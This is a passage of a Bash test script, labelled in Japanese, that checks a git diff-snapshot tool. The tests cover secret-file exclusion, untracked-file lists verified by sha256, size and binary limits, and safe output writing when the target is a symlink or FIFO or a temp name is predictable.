secf "$OUT" "追跡差分(stat)"
ckf "⑥⁗ stat に config/.env が出ない" grep -qF 'config/.env' "$SECF"
ckf "⑥⁗ パッチに config/.env が出ない" grep -qF 'config/.env' "$PATCHF"
ckf "⑥⁗ 機密の値がどこにも出ない" grep -qF 'SECRET=inconfig' "$OUT"

# ── ⑥⁗′ 逆向き: 除外ファイル→ディレクトリ置換 ──
base_repo c06f
printf 'SECRET=oldconfig\n' >"$R/config"
GIT "$R" add config
GIT "$R" commit -q -m cfg
B="$(GIT "$R" rev-parse HEAD)"
rm -f "$R/config"
mkdir -p "$R/config"
printf 'PUBLICOK2\n' >"$R/config/public.txt"
GIT "$R" add -A
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --patch-out "$PATCHF" --exclude '^config$'
ckeq "⑥⁗′ 除外ファイル→ディレクトリ置換: exit 0" "$RC" 0
secf "$OUT" "追跡差分"
ckt "⑥⁗′ 本文に config/public.txt の追加が残る" grep -qF 'PUBLICOK2' "$SECF"
ckf "⑥⁗′ 本文に旧 config の削除 hunk が出ない" grep -qF 'SECRET=oldconfig' "$SECF"
secf "$OUT" "追跡差分(stat)"
ckt "⑥⁗′ stat に config/public.txt が残る" grep -qF 'config/public.txt' "$SECF"
ckt "⑥⁗′ パッチに config/public.txt が残る" grep -qF 'PUBLICOK2' "$PATCHF"
ckf "⑥⁗′ パッチに旧 config の内容が出ない" grep -qF 'SECRET=oldconfig' "$PATCHF"

# ── ⑦ 既定除外 ──
base_repo c07
mkdir -p "$R/.claude/reviews"
printf 'REVIEWBODY\n' >"$R/.claude/reviews/x.md"
printf 'GRASPBODY\n' >"$R/.claude/grasp.md"
printf 'SETTINGSBODY\n' >"$R/.claude/settings.local.json"
printf 'DONEBODY\n' >"$R/.claude/.understand-project-done"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude '^$'
ckeq "⑦ 既定除外: exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
for m in REVIEWBODY GRASPBODY SETTINGSBODY DONEBODY; do
  ckf "⑦ $m が本文に出ない" grep -qF "$m" "$SECF"
done
secf "$OUT" "除外(既定)"
for p in '.claude/reviews/x.md' '.claude/grasp.md' '.claude/settings.local.json' '.claude/.understand-project-done'; do
  ckt "⑦ $p が除外(既定)に載る" grep -qF "$p" "$SECF"
done

# ── ⑧ 存在しない base ──
base_repo c08
reset_out
run --cwd "$R" --base 0000000000000000000000000000000000000000 --out "$OUT" --exclude-glob '.env'
ckeq "⑧ 存在しない base: exit 4" "$RC" 4
ckt "⑧ stderr に ERROR [no-base]" inf "$CASE_ERR" 'ERROR [no-base]'
ckf "⑧ --out が作られない" test -e "$OUT"

# ── ⑨ コミット 0 のリポジトリ ──
mkrepo c09
R="$WORK/c09"
EMPTY_TREE="$(GIT "$R" hash-object -t tree /dev/null)"
printf 'NEWBODY\n' >"$R/new.ts"
reset_out
run --cwd "$R" --base "$EMPTY_TREE" --out "$OUT" --exclude-glob '.env'
ckeq "⑨ コミット 0 のリポジトリ: exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckt "⑨ 未追跡に +++ b/new.ts" inf "$SECF" '+++ b/new.ts'
ckt "⑨ 未追跡に内容行" inf "$SECF" '+NEWBODY'
headf "$OUT"
ckf "⑨ 見出しに WARNING が無い" inf "$HDF" 'WARNING'
ckt "⑨ 祖先判定は不能と書かれる" inf "$HDF" '祖先判定は不能(基準が tree / HEAD 無し)'
ckt "⑨ 現在 HEAD が(HEAD 無し)" inf "$HDF" '現在 HEAD: (HEAD 無し)'
ckf "⑨ stderr に fatal: を含まない" inf "$CASE_ERR" 'fatal:'

# ── ⑩ 変更が 1 つも無い ──
base_repo c10
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑩ 変更なし: exit 0" "$RC" 0
ALL_SECTIONS=("追跡差分(stat)" "追跡差分" "未追跡ファイル" "除外(機密)" "除外(既定)" \
              "基準時点から存在(対象外)" "含められなかった未追跡" "内容を省略した未追跡" \
              "内容を省略した追跡" "改竄の疑い" "gitignore により除外(.gitignore 以外)")
for h in "${ALL_SECTIONS[@]}"; do
  ckt "⑩ 節 「$h」 が存在する" sec_exists "$OUT" "$h"
  secf "$OUT" "$h"
  ckt "⑩ 節 「$h」 が(差分なし)" inf "$SECF" '(差分なし)'
done

# ── ⑩′ 要約行の件数 ──
base_repo c10b
printf 'NEWTS\n' >"$R/new.ts"
printf 'SECRET=x\n' >"$R/.env"
mkdir -p "$R/.claude"
printf 'GRASP\n' >"$R/.claude/grasp.md"
printf 'OLDBODY\n' >"$R/old.txt"
bigfile "$R/big.bin" 1100000
mkrepo c10b/sub
printf 'SUBBODY\n' >"$R/sub/x.txt"
mkdir -p "$R/tools/.git"
printf 'POST\n' >"$R/tools/.git/post.sh"
mkdir -p "$R/hid"
printf 'HID\n' >"$R/hid/h.txt"
PRE10="$WORK/pre10b"
printf 'old.txt\0' >"$PRE10"
PRE10SHA="$(sha256sum -- "$PRE10" | cut -d' ' -f1)"
if [ "$IS_ROOT" -eq 1 ]; then
  ok "⑩′ 読めないディレクトリは置かない(root のため飛ばす)"
  EXPECT_SUM='要約: 未追跡 7 件(本文 1 / 除外(機密) 1 / 除外(既定) 1 / 対象外 1 / 省略 1 / 含められず 2) / gitignore 外 0'
  EXPECT_RC=0
else
  chmod 111 "$R/hid"
  ok "⑩′ 読めないディレクトリを置いた"
  EXPECT_SUM='要約: 未追跡 8 件(本文 1 / 除外(機密) 1 / 除外(既定) 1 / 対象外 1 / 省略 1 / 含められず 3) / gitignore 外 0'
  EXPECT_RC=21
fi
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
    --pre-untracked "$PRE10" --pre-untracked-sha256 "$PRE10SHA"
ckeq "⑩′ 要約行の件数: exit" "$RC" "$EXPECT_RC"
ckt "⑩′ 要約行が期待どおり" inf "$OUT" "$EXPECT_SUM"
# N が各節の実件数の和になっている(二重計上・分類漏れの検出)
c_a=0; c_b1=0; c_b2=0; c_c=0; c_d=0; c_e=0
secf "$OUT" "未追跡ファイル"; c_a="$(grep -c '^+++ b/' "$SECF" || true)"
secf "$OUT" "除外(機密)"; c_b1="$(grep -c . "$SECF" || true)"
secf "$OUT" "除外(既定)"; c_b2="$(grep -c . "$SECF" || true)"
secf "$OUT" "基準時点から存在(対象外)"; c_c="$(grep -c . "$SECF" || true)"
secf "$OUT" "内容を省略した未追跡"; c_d="$(grep -c . "$SECF" || true)"
secf "$OUT" "含められなかった未追跡"; c_e="$(grep -c . "$SECF" || true)"
ckt "⑩′ 要約の内訳が各節の実件数と一致" inf "$OUT" \
  "要約: 未追跡 $((c_a + c_b1 + c_b2 + c_c + c_d + c_e)) 件(本文 $c_a / 除外(機密) $c_b1 / 除外(既定) $c_b2 / 対象外 $c_c / 省略 $c_d / 含められず $c_e) / gitignore 外 0"
chmod 755 "$R/hid" 2>/dev/null || true

# ── ⑪ usage ──
base_repo c11
mkdir -p "$WORK/c11notrepo"
usage_case() { # $1=説明 残り=引数
  local d="$1"
  shift
  reset_out
  run "$@"
  if [ "$RC" = 2 ] && grep -qF -e 'ERROR [usage]' -- "$CASE_ERR"; then ok "⑪ usage: $d"; else ng "⑪ usage: $d(exit $RC)"; fi
}
usage_case "--cwd 省略" --base "$B" --out "$OUT" --exclude-glob '.env'
usage_case "--out 省略" --cwd "$R" --base "$B" --exclude-glob '.env'
usage_case "--base 省略" --cwd "$R" --out "$OUT" --exclude-glob '.env'
usage_case "--exclude と --exclude-glob の両方省略" --cwd "$R" --base "$B" --out "$OUT"
usage_case "--exclude ''" --cwd "$R" --base "$B" --out "$OUT" --exclude ''
usage_case "--exclude-glob ''" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob ''
usage_case "--pre-untracked に存在しないパス" --cwd "$R" --base "$B" --out "$OUT" \
  --exclude-glob '.env' --pre-untracked "$WORK/nosuchlist" --pre-untracked-sha256 deadbeef
usage_case "--cwd が git リポジトリでない" --cwd "$WORK/c11notrepo" --base "$B" --out "$OUT" --exclude-glob '.env'
usage_case "--patch-out なしの --patch-base" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --patch-base HEAD
usage_case "--precheck と --out の併用" --cwd "$R" --precheck --out "$OUT"
usage_case "--include-untracked ''" --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
  --include-untracked ''
PRE11E="$WORK/pre11empty"
printf 'a.txt\0\0' >"$PRE11E"
PRE11ESHA="$(sha256sum -- "$PRE11E" | cut -d' ' -f1)"
usage_case "--pre-untracked の一覧に空のレコード" --cwd "$R" --base "$B" --out "$OUT" \
  --exclude-glob '.env' --pre-untracked "$PRE11E" --pre-untracked-sha256 "$PRE11ESHA"

# ── ⑪′ --cwd がサブディレクトリ・--out が相対パス ──
base_repo c11b
printf 'RT1\n' >"$R/roottracked.txt"
GIT "$R" add roottracked.txt
GIT "$R" commit -q -m rt
B="$(GIT "$R" rev-parse HEAD)"
printf 'RT2\n' >"$R/roottracked.txt"
mkdir -p "$R/pkg"
printf 'PKGT\n' >"$R/pkg/t.txt"
rm -f "$WORK/rel.md"
RC=0
( cd "$WORK" && bash "$TARGET" --cwd "$R/pkg" --base "$B" --out rel.md --exclude-glob '.env' </dev/null ) \
  >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?
ckeq "⑪′ サブディレクトリ + 相対 --out: exit 0" "$RC" 0
ckt "⑪′ 呼び出し側 cwd 基準で生成される" test -f "$WORK/rel.md"
if [ -f "$WORK/rel.md" ]; then
  secf "$WORK/rel.md" "未追跡ファイル"
  ckt "⑪′ 未追跡は toplevel 相対(pkg/t.txt)" inf "$SECF" '+++ b/pkg/t.txt'
  secf "$WORK/rel.md" "追跡差分"
  ckt "⑪′ 追跡差分も toplevel 基準(roottracked.txt)" inf "$SECF" '+RT2'
else
  ng "⑪′ 未追跡は toplevel 相対(pkg/t.txt)"
  ng "⑪′ 追跡差分も toplevel 基準(roottracked.txt)"
fi

# ── ⑫ 空白・先頭ハイフンを含む新規ファイル ──
base_repo c12
printf 'SPACEBODY\n' >"$R/my file.txt"
printf 'DASHBODY\n' >"$R/-dash.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑫ 空白・先頭ハイフン: exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckt "⑫ +++ b/my file.txt" inf "$SECF" '+++ b/my file.txt'
ckt "⑫ +++ b/-dash.txt" inf "$SECF" '+++ b/-dash.txt'
ckt "⑫ 空白入りの内容行" inf "$SECF" '+SPACEBODY'
ckt "⑫ 先頭ハイフンの内容行" inf "$SECF" '+DASHBODY'

# ── ⑬ 出力先をリポジトリ直下に置いて 2 回生成 ──
base_repo c13
printf 'UBODY\n' >"$R/u.txt"
O13="$R/out13.md"
P13="$R/out13.patch"
rm -f "$O13" "$P13"
run --cwd "$R" --base "$B" --out "$O13" --patch-out "$P13" --exclude-glob '.env'
ckeq "⑬ 1 回目: exit 0" "$RC" 0
secf "$O13" "除外(既定)"
ckf "⑬ 1 回目は出力先が除外節に載らない" inf "$SECF" 'out13.md'
rm -f "$P13"
run --cwd "$R" --base "$B" --out "$O13" --patch-out "$P13" --exclude-glob '.env'
ckeq "⑬ 2 回目: exit 0" "$RC" 0
for h in "追跡差分(stat)" "追跡差分" "未追跡ファイル"; do
  secf "$O13" "$h"
  ckf "⑬ 2 回目「$h」の本文に出力先が出ない" inf "$SECF" 'out13.md'
done
secf "$O13" "除外(既定)"
ckt "⑬ 2 回目の出力先が理由「出力先自身」で載る" ing "$SECF" '^out13\.md	.*出力先自身'
ckf "⑬ 2 回目の --patch-out は列挙の時点で未存在" inf "$SECF" 'out13.patch'
ckf "⑬ .diff-snapshot. を含むパスが出力全体に無い" inf "$O13" '.diff-snapshot.'
rm -f "$R/same.md"
run --cwd "$R" --base "$B" --out "$R/same.md" --patch-out "$R/same.md" --exclude-glob '.env'
ckeq "⑬ --patch-out と --out が同じパス: exit 2" "$RC" 2
mkdir -p "$R/dirout" "$R/dirpatch"
run --cwd "$R" --base "$B" --out "$R/dirout" --exclude-glob '.env'
ckeq "⑬ --out に既存ディレクトリ: exit 2" "$RC" 2
ckt "⑬ --out の既存ディレクトリが変更されない" test -d "$R/dirout"
rm -f "$R/o2.md"
run --cwd "$R" --base "$B" --out "$R/o2.md" --patch-out "$R/dirpatch" --exclude-glob '.env'
ckeq "⑬ --patch-out に既存ディレクトリ: exit 2" "$RC" 2
ckt "⑬ --patch-out の既存ディレクトリが変更されない" test -d "$R/dirpatch"
rm -rf "$WORK/deep13"
run --cwd "$R" --base "$B" --out "$WORK/deep13/a/b/c/out.md" --exclude-glob '.env'
ckeq "⑬ 多階層の未作成ディレクトリ: exit 0" "$RC" 0
ckt "⑬ 多階層の未作成ディレクトリに生成される" test -f "$WORK/deep13/a/b/c/out.md"
ckt "⑬ .diff-snapshot. ディレクトリが残らない" no_pubdir "$R"

# ── ⑬′ realpath / readlink の無いサンドボックス PATH ──
make_sandbox "$WORK/sb-nolink" realpath readlink
base_repo c13b
printf 'UBODY2\n' >"$R/u.txt"
O13B="$R/out13b.md"
P13B="$R/out13b.patch"
rm -f "$O13B" "$P13B"
RC=0
env PATH="$WORK/sb-nolink" bash "$TARGET" --cwd "$R" --base "$B" --out "$O13B" \
  --patch-out "$P13B" --exclude-glob '.env' </dev/null >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?
ckeq "⑬′ realpath / readlink 無し(1 回目): exit 0" "$RC" 0
rm -f "$P13B"
RC=0
env PATH="$WORK/sb-nolink" bash "$TARGET" --cwd "$R" --base "$B" --out "$O13B" \
  --patch-out "$P13B" --exclude-glob '.env' </dev/null >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?
ckeq "⑬′ realpath / readlink 無し(2 回目): exit 0" "$RC" 0
secf "$O13B" "除外(既定)"
ckt "⑬′ フォールバックでも出力先自身を判定できる" ing "$SECF" '^out13b\.md	.*出力先自身'

# ── ⑬″ ネストしたディレクトリごと削除 ──
base_repo c13c
mkdir -p "$R/dir/sub"
printf 'FILEBODY\n' >"$R/dir/sub/file.txt"
GIT "$R" add dir/sub/file.txt
GIT "$R" commit -q -m nested
B="$(GIT "$R" rev-parse HEAD)"
rm -r "$R/dir"
O13C="$R/out13c.md"
P13C="$R/out13c.patch"
rm -f "$O13C" "$P13C"
run --cwd "$R" --base "$B" --out "$O13C" --patch-out "$P13C" --exclude-glob '.env'
ckeq "⑬″ ネストしたディレクトリごと削除: exit 0" "$RC" 0
secf "$O13C" "追跡差分"
ckt "⑬″ 削除 hunk が出る" inf "$SECF" '-FILEBODY'
GIT "$R" worktree add -q --detach "$WORK/at13c" HEAD >/dev/null 2>&1
ckt "⑬″ パッチが別ツリーで git apply --check を通る" \
  env -u GIT_INDEX_FILE "$REAL_GIT" -C "$WORK/at13c" apply --check -- "$P13C"

# ── ⑬‴ 出力先が symlink ──
base_repo c13d
printf 'OUTSIDE13\n' >"$WORK/outside13.txt"
ln -s "$WORK/outside13.txt" "$R/link-out.md"
run --cwd "$R" --base "$B" --out "$R/link-out.md" --exclude-glob '.env'
ckeq "⑬‴(1) --out の最終要素が symlink: exit 2" "$RC" 2
ckeq "⑬‴(1) リンク先の内容が変わらない" "$(cat "$WORK/outside13.txt")" 'OUTSIDE13'
ln -s "$WORK/outside13.txt" "$R/link-patch.patch"
rm -f "$R/o13d.md"
run --cwd "$R" --base "$B" --out "$R/o13d.md" --patch-out "$R/link-patch.patch" --exclude-glob '.env'
ckeq "⑬‴(1) --patch-out の最終要素が symlink: exit 2" "$RC" 2
ckeq "⑬‴(1) --patch-out 側でもリンク先が変わらない" "$(cat "$WORK/outside13.txt")" 'OUTSIDE13'
ln -s "$WORK/nowhere13" "$R/dead-out.md"
run --cwd "$R" --base "$B" --out "$R/dead-out.md" --exclude-glob '.env'
ckeq "⑬‴(1) リンク切れの symlink でも exit 2" "$RC" 2
ckf "⑬‴(1) リンク切れのリンク先が作られない" test -e "$WORK/nowhere13"
mkdir -p "$R/.claude" "$WORK/outdir13"
printf 'DIRMARK\n' >"$WORK/outdir13/keep.txt"
ln -s "$WORK/outdir13" "$R/.claude/reviews"
run --cwd "$R" --base "$B" --out "$R/.claude/reviews/out.md" --exclude-glob '.env'
ckeq "⑬‴(2) --out の親ディレクトリが symlink: exit 2" "$RC" 2
ckeq "⑬‴(2) リンク先ディレクトリの内容が変わらない" "$(ls -A "$WORK/outdir13" | tr '\n' ' ')" 'keep.txt '
mkfifo "$R/fifo-out.md"
grun --cwd "$R" --base "$B" --out "$R/fifo-out.md" --exclude-glob '.env'
ckeq "⑬‴(3) --out が FIFO: 待機せず exit 2" "$RC" 2
ckt "⑬‴(3) FIFO が変更されない" test -p "$R/fifo-out.md"
mkfifo "$R/fifo.patch"
rm -f "$R/o13d2.md"
grun --cwd "$R" --base "$B" --out "$R/o13d2.md" --patch-out "$R/fifo.patch" --exclude-glob '.env'
ckeq "⑬‴(3) --patch-out が FIFO: 待機せず exit 2" "$RC" 2
ckt "⑬‴(3) --patch-out の FIFO が変更されない" test -p "$R/fifo.patch"
ln -s "$R" "$WORK/alias13"
run --cwd "$WORK/alias13" --base "$B" --out "$WORK/alias13/.claude/reviews/out.md" --exclude-glob '.env'
ckeq "⑬‴(4) symlink 経由の論理パスでも検査が働く: exit 2" "$RC" 2
ckeq "⑬‴(4) リンク先ディレクトリの内容が変わらない" "$(ls -A "$WORK/outdir13" | tr '\n' ' ')" 'keep.txt '
ckt "⑬‴ .diff-snapshot. ディレクトリが残らない" no_pubdir "$R"

# ── ⑬⁗ 予測可能な一時名を使わない ──
base_repo c13e
printf 'UBODY3\n' >"$R/u.txt"
STUB13E="$WORK/stub13e"
mkdir -p "$STUB13E"
cat >"$STUB13E/mktemp" <<EOF
#!/usr/bin/env bash
printf '%s\n' "\$*" >>"\$SELFTEST_MKTEMP_LOG"
exec "$REAL_MKTEMP" "\$@"
EOF
cat >"$STUB13E/mv" <<EOF
#!/usr/bin/env bash
printf '%s\t%s\n' "\${@: -2:1}" "\${@: -1}" >>"\$SELFTEST_MV_LOG"
exec "$REAL_MV" "\$@"
EOF
chmod +x "$STUB13E/mktemp" "$STUB13E/mv"
O13E="$R/out13e.md"
P13E="$R/out13e.patch"
rm -f "$O13E" "$P13E"
printf 'OUTSIDE13E\n' >"$WORK/outside13e.txt"
ln -s "$WORK/outside13e.txt" "$R/out13e.md.tmp.1"
export SELFTEST_MKTEMP_LOG="$WORK/mktemp13e.log"
export SELFTEST_MV_LOG="$WORK/mv13e.log"
: >"$SELFTEST_MKTEMP_LOG"
: >"$SELFTEST_MV_LOG"
RC=0
env PATH="$STUB13E:$PATH" bash "$TARGET" --cwd "$R" --base "$B" --out "$O13E" \
  --patch-out "$P13E" --exclude-glob '.env' </dev/null >"$CASE_OUT" 2>"$CASE_ERR" || RC=$?
ckeq "⑬⁗ mktemp / mv スタブ付きの実行: exit 0" "$RC" 0
bad_tmpl=0
while IFS= read -r l; do
  case "$l" in
    *XXXXXX*)
      case "$l" in
        "-d $R/.diff-snapshot.XXXXXX") : ;;
        *) bad_tmpl=1 ;;
      esac ;;
  esac
done <"$SELFTEST_MKTEMP_LOG"
ckeq "⑬⁗ template 付きの mktemp -d は出力先ディレクトリ直下の .diff-snapshot.XXXXXX だけ" "$bad_tmpl" 0
ckt "⑬⁗ template 付きの mktemp -d が実際に呼ばれている" ing "$SELFTEST_MKTEMP_LOG" 'XXXXXX'
bad_mv=0
mv_n=0
while IFS= read -r l; do
  mv_n=$((mv_n + 1))
  src="${l%%	*}"
  case "$src" in
    "$R"/.diff-snapshot.*/*) : ;;
    *) bad_mv=1 ;;
  esac
done <"$SELFTEST_MV_LOG"
ckeq "⑬⁗ mv の移動元がすべて .diff-snapshot. 配下" "$bad_mv" 0
ckne "⑬⁗ mv が実際に呼ばれている" "$mv_n" 0
ckeq "⑬⁗ 出力先ディレクトリの <out>.tmp.* の symlink 先が変わらない" "$(cat "$WORK/outside13e.txt")" 'OUTSIDE13E'
unset SELFTEST_MKTEMP_LOG SELFTEST_MV_LOG

sha_str() { printf '%s' "$1" | sha256sum | cut -d' ' -f1; }
sha_file() { sha256sum -- "$1" | cut -d' ' -f1; }
mklist() { # $1=出力パス 残り=NUL 区切りで並べるパス
  local o="$1" p
  shift
  : >"$o"
  for p in "$@"; do printf '%s\0' "$p" >>"$o"; done
}

# ── ⑭ ネストした git リポジトリ ──
base_repo c14
mkrepo c14/sub
printf 'SUBBODY\n' >"$R/sub/x.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑭ ネスト repo: exit 0" "$RC" 0
secf "$OUT" "含められなかった未追跡"
ckt "⑭ sub/ が理由「ネスト repo」で載る" ing "$SECF" '^sub/	ネスト repo$'
ckf "⑭ ネスト repo の内容が出ない" inf "$OUT" 'SUBBODY'

# ── ⑮ 基準時点の未追跡一覧 ──
base_repo c15
printf 'OLDBODY\n' >"$R/old.txt"
PRE15="$WORK/pre15"
mklist "$PRE15" old.txt
PRE15SHA="$(sha_file "$PRE15")"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
    --pre-untracked "$PRE15" --pre-untracked-sha256 "$PRE15SHA"
ckeq "⑮ 基準時点の未追跡一覧: exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckf "⑮ 一覧にある old.txt は本文に出ない" inf "$SECF" 'OLDBODY'
secf "$OUT" "基準時点から存在(対象外)"
ckt "⑮ old.txt が種別・sha256・バイト数付きで載る" \
  ing "$SECF" "^old\.txt	通常ファイル	$(sha_str 'OLDBODY
')	8\$"

# ── ⑮′ 一覧に無い新規ファイル ──
printf 'NEW2BODY\n' >"$R/new2.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
    --pre-untracked "$PRE15" --pre-untracked-sha256 "$PRE15SHA"
ckeq "⑮′ 一覧に無い新規ファイル: exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckt "⑮′ 一覧に無い new2.txt は本文に出る" inf "$SECF" '+NEW2BODY'

# ── ⑮″ --include-untracked ──
printf 'SECRET=pre\n' >"$R/.env"
PRE15B="$WORK/pre15b"
mklist "$PRE15B" old.txt .env
PRE15BSHA="$(sha_file "$PRE15B")"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
    --pre-untracked "$PRE15B" --pre-untracked-sha256 "$PRE15BSHA" \
    --include-untracked old.txt --include-untracked .env
ckeq "⑮″ --include-untracked: exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckt "⑮″ 一覧にある old.txt が本文に出る" inf "$SECF" '+OLDBODY'
secf "$OUT" "基準時点から存在(対象外)"
ckf "⑮″ old.txt が対象外節から消える" inf "$SECF" 'old.txt'
ckf "⑮″ 機密名は --include-untracked でも本文に出ない" inf "$OUT" 'SECRET=pre'
secf "$OUT" "除外(機密)"
ckt "⑮″ 機密名は除外(機密)に載る" inf "$SECF" '.env'
rm -f "$R/.env"

# ── ⑮‴ 一覧の改竄 ──
PRE15C="$WORK/pre15c"
mklist "$PRE15C" old.txt
PRE15CSHA="$(sha_file "$PRE15C")"
printf 'new2.txt\0' >>"$PRE15C"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
    --pre-untracked "$PRE15C" --pre-untracked-sha256 "$PRE15CSHA"
ckeq "⑮‴ 一覧を後から追記: exit 2" "$RC" 2
ckf "⑮‴ --out が作られない" test -e "$OUT"
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --pre-untracked "$PRE15"
ckeq "⑮‴ --pre-untracked だけ: exit 2" "$RC" 2
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --pre-untracked-sha256 "$PRE15SHA"
ckeq "⑮‴ --pre-untracked-sha256 だけ: exit 2" "$RC" 2

# ── ⑮⁗ --pre-untracked が FIFO / symlink / ディレクトリ ──
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
    --pre-untracked "$PRE15" --pre-untracked-sha256 "$PRE15SHA"
ckeq "⑮⁗ 既存の --out を用意: exit 0" "$RC" 0
OUT15_BEFORE="$(sha_file "$OUT")"
FIFO15="$WORK/fifo15"
rm -f "$FIFO15"
mkfifo "$FIFO15"
grun --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
    --pre-untracked "$FIFO15" --pre-untracked-sha256 deadbeef
ckeq "⑮⁗ --pre-untracked が FIFO: 待機せず exit 2" "$RC" 2
ckeq "⑮⁗ FIFO のとき既存の --out が変わらない" "$(sha_file "$OUT")" "$OUT15_BEFORE"
ln -sf "$PRE15" "$WORK/prelink15"
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
    --pre-untracked "$WORK/prelink15" --pre-untracked-sha256 "$PRE15SHA"
ckeq "⑮⁗ --pre-untracked が symlink: exit 2" "$RC" 2
mkdir -p "$WORK/predir15"
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
    --pre-untracked "$WORK/predir15" --pre-untracked-sha256 "$PRE15SHA"
ckeq "⑮⁗ --pre-untracked がディレクトリ: exit 2" "$RC" 2
rm -f "$FIFO15"

# ── ⑮⁗′ 対象外節の種別別取得 ──
base_repo c15e
printf 'SECRET_MARK\n' >"$R/.env"
ln -s .env "$R/plink"
mkfifo "$R/fifo"
ln -s fifo "$R/flink"
ln -s nowhere "$R/dlink"
mkrepo c15e/sub
printf 'SUBX\n' >"$R/sub/x.txt"
printf 'NOREAD\n' >"$R/noread.txt"
bigfile "$R/big.txt" 2097152
printf 'OLDBODY\n' >"$R/old.txt"
[ "$IS_ROOT" -eq 1 ] || chmod 000 "$R/noread.txt"
PRE15E="$WORK/pre15e"
mklist "$PRE15E" plink flink dlink sub/ noread.txt big.txt old.txt
PRE15ESHA="$(sha_file "$PRE15E")"
reset_out
grun --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
    --pre-untracked "$PRE15E" --pre-untracked-sha256 "$PRE15ESHA"
ckeq "⑮⁗′ 対象外節の種別別取得: 待機せず exit 0" "$RC" 0
secf "$OUT" "基準時点から存在(対象外)"
ckt "⑮⁗′ plink の種別が symlink・sha256 がリンク文字列のもの" \
  ing "$SECF" "^plink	symlink	$(sha_str '.env')	4\$"
ckt "⑮⁗′ flink の種別が symlink" ing "$SECF" "^flink	symlink	$(sha_str 'fifo')	4\$"
ckt "⑮⁗′ dlink の種別が symlink" ing "$SECF" "^dlink	symlink	$(sha_str 'nowhere')	7\$"
ckt "⑮⁗′ sub/ の種別がネスト repo" ing "$SECF" '^sub/	ネスト repo	-	-$'
if [ "$IS_ROOT" -eq 1 ]; then
  ok "⑮⁗′ noread.txt の種別が読めない(root のため飛ばす)"
else
  ckt "⑮⁗′ noread.txt の種別が読めない" ing "$SECF" '^noread\.txt	読めない	-	-$'
fi
ckt "⑮⁗′ big.txt が 1 MiB 超・sha256 は -・バイト数 2097152" \
  ing "$SECF" '^big\.txt	通常ファイル(1 MiB 超)	-	2097152$'
ckt "⑮⁗′ old.txt が通常ファイル" ing "$SECF" '^old\.txt	通常ファイル	'
ckf "⑮⁗′ 出力全体に機密の値が無い" inf "$OUT" 'SECRET_MARK'
# リンク文字列が改行で終わる symlink(末尾の改行 1 個だけを除く)
NLTGT=$(printf 'target\n')'
'
base_repo c15f
ln -s -- "$NLTGT" "$R/nlink"
PRE15F="$WORK/pre15f"
mklist "$PRE15F" nlink
PRE15FSHA="$(sha_file "$PRE15F")"
reset_out
grun --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' \
    --pre-untracked "$PRE15F" --pre-untracked-sha256 "$PRE15FSHA"
ckeq "⑮⁗′ 改行で終わるリンク文字列: exit 0" "$RC" 0
secf "$OUT" "基準時点から存在(対象外)"
ckt "⑮⁗′ 改行で終わるリンク文字列の sha256 とバイト数" \
  ing "$SECF" "^nlink	symlink	$(sha_str "$NLTGT")	${#NLTGT}\$"
ckeq "⑮⁗′ リンク文字列の長さは 7(target + 改行)" "${#NLTGT}" 7
chmod 644 "$R/noread.txt" 2>/dev/null || true
rm -f "$R/fifo"

# ── ⑯ バイナリと 1 MiB 超の未追跡 ──
base_repo c16
binfile "$R/bin.dat"
bigfile "$R/big.dat" 1100000
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env'
ckeq "⑯ バイナリと 1 MiB 超: exit 0" "$RC" 0
secf "$OUT" "内容を省略した未追跡"
ckt "⑯ bin.dat が理由「バイナリ」で載る" ing "$SECF" '^bin\.dat	バイナリ$'
ckt "⑯ big.dat が理由「1 MiB 超」で載る" ing "$SECF" '^big\.dat	1 MiB 超$'
secf "$OUT" "未追跡ファイル"
ckf "⑯ 省略した未追跡の内容が本文に出ない" inf "$SECF" 'bin.dat'

# ── ⑯′ 総量上限 ──
base_repo c16b
head -c 59 /dev/zero | tr '\0' '1' >"$R/u1.txt"; printf '\n' >>"$R/u1.txt"
head -c 59 /dev/zero | tr '\0' '2' >"$R/u2.txt"; printf '\n' >>"$R/u2.txt"
head -c 9 /dev/zero | tr '\0' '3' >"$R/u3.txt"; printf '\n' >>"$R/u3.txt"
reset_out
run --cwd "$R" --base "$B" --out "$OUT" --exclude-glob '.env' --max-untracked-bytes 100
ckeq "⑯′ 総量上限: exit 0" "$RC" 0
secf "$OUT" "未追跡ファイル"
ckt "⑯′ u1.txt は本文に出る" inf "$SECF" '+++ b/u1.txt'
ckf "⑯′ u2.txt は本文に出ない" inf "$SECF" '+++ b/u2.txt'
ckf "⑯′ u3.txt は本文に出ない(上限内でも超過後は省略)" inf "$SECF" '+++ b/u3.txt'
